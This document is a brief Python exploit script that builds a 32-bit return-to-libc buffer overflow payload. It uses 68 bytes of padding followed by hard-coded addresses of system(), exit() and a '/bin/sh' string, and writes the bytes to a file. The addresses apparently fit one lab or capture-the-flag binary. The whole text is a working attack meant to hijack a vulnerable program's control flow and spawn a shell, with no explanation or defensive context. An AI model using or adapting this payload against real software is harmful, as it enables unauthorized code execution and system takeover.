import struct

# Address of system() function
system_addr = 0xf7e4c850

# Address of "/bin/sh" string
bin_sh_addr = 0xf7f897ec

# Address of exit() function
exit_addr = 0xf7e3faf0

# Padding to overflow the buffer
padding = b"A" * 68

# ROP chain
rop_chain = struct.pack("<I", system_addr)
rop_chain += struct.pack("<I", exit_addr)
rop_chain += struct.pack("<I", bin_sh_addr)

# Construct the payload
payload = padding + rop_chain

# Save the payload to a file
with open("payload", "wb") as f:
    f.write(payload)
